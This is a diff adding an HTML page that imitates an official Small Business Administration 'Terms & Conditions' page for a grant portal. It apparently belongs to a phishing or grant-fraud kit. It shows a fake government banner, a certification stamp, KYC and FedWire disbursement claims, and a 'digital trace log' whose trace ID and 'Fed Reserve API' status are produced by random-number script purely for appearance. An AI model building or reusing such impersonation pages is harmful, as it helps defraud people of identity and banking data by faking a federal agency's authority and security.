@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | 2026 Terms of Service</title>
+    <style>
+        :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --sba-accent: #0071bc; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .nav-header { background: var(--sba-blue); padding: 15px; text-align: center; position: relative; }
+        
+        .container { max-width: 550px; margin: 20px auto; padding: 0 15px; }
+        .card { background: white; padding: 35px 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 6px solid var(--sba-red); position: relative; }
+        
+        .legal-stamp { border: 2px solid #ef4444; color: #ef4444; padding: 4px 10px; display: inline-block; transform: rotate(-3deg); font-weight: 900; font-size: 11px; margin-bottom: 15px; border-radius: 4px; opacity: 0.8; letter-spacing: 1px; }
+        
+        .terms-content { font-size: 13px; color: #334155; line-height: 1.7; height: 350px; overflow-y: auto; padding-right: 10px; border-bottom: 1px solid #f1f5f9; margin-bottom: 20px; }
+        .terms-content h3 { font-size: 13px; color: var(--sba-blue); margin: 20px 0 8px; text-transform: uppercase; font-weight: 800; }
+        
+        .sig-box { background: #f8fafc; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0; font-family: 'Courier New', monospace; font-size: 10px; color: #64748b; line-height: 1.6; }
+        .sig-box b { color: var(--sba-blue); }
+
+        .accept-btn { background: var(--sba-blue); color: white; padding: 18px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px; margin-top: 20px; box-shadow: 0 4px 12px rgba(0, 39, 76, 0.2); }
+        
+        /* Scrollbar styling */
+        .terms-content::-webkit-scrollbar { width: 5px; }
+        .terms-content::-webkit-scrollbar-track { background: #f1f5f9; }
+        .terms-content::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
+    </div>
+
+    <div class="nav-header">
+        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight: 900;">SBA.GOV</h1>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="legal-stamp">CERTIFIED FY2026</div>
+
+            <h2 style="font-size: 22px; color: var(--sba-blue); margin: 0 0 5px;">Terms & Conditions</h2>
+            <p style="font-size: 10px; color: #94a3b8; font-weight: 800; text-transform: uppercase; margin-bottom: 20px;">Revision: FY2026-V.4 | Office of General Counsel</p>
+
+            <div class="terms-content">
+                <p style="background: #f0f7ff; padding: 12px; border-radius: 8px; border-left: 4px solid var(--sba-accent); font-size: 12px; color: #1e40af;">
+                    By interacting with this portal, you agree that all provided information is subject to federal audit.
+                </p>
+
+                <h3>1.0 Authorization</h3>
+                <p>Access is strictly limited to verified U.S. residents. Users must undergo <b>Identity Authentication (KYC)</b> as per Patriot Act requirements to qualify for disbursement.</p>
+
+                <h3>2.0 Federal Fraud Statutes</h3>
+                <p>Intentional misrepresentation to obtain federal funds is a felony. Under <b>18 U.S.C. § 1001</b>, false statements are punishable by up to 5 years in prison and $250,000 in fines.</p>
+
+                <h3>3.0 Disbursement Protocols</h3>
+                <p>Funds are released via the <b>Federal Reserve Bank (FedWire)</b>. Transfers are only permitted to accounts matching the verified applicant's legal identity.</p>
+
+                <h3>4.0 Privacy & Encryption</h3>
+                <p>PII and banking data are secured using 256-bit AES encryption. Data usage is limited to grant allocation and disbursement verification under the <b>Privacy Act of 1974</b>.</p>
+            </div>
+
+            <div class="sig-box">
+                <b>DIGITAL TRACE LOG:</b><br>
+                STATUS: SESSION_ENCRYPTED<br>
+                TIMESTAMP: <span id="legalTime"></span><br>
+                TRACE_ID: <span id="legalTrace"></span><br>
+                GATEWAY: FED_RESERVE_API_ACTIVE
+            </div>
+
+            <button onclick="history.back()" class="accept-btn">I ACCEPT & AGREE TO TERMS</button>
+        </div>
+
+        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 25px; line-height: 1.5;">
+            Small Business Administration | Office of General Counsel<br>
+            409 3rd St, SW, Washington, DC 20416
+        </p>
+    </div>
+
+    <script>
+        function updateTrace() {
+            const now = new Date();
+            document.getElementById('legalTime').innerText = now.toLocaleString();
+            document.getElementById('legalTrace').innerText = "SBA-26-" + Math.random().toString(36).substring(2, 10).toUpperCase();
+        }
+        updateTrace();
+        setInterval(updateTrace, 5000);
+    </script>
+</body>
+</html>
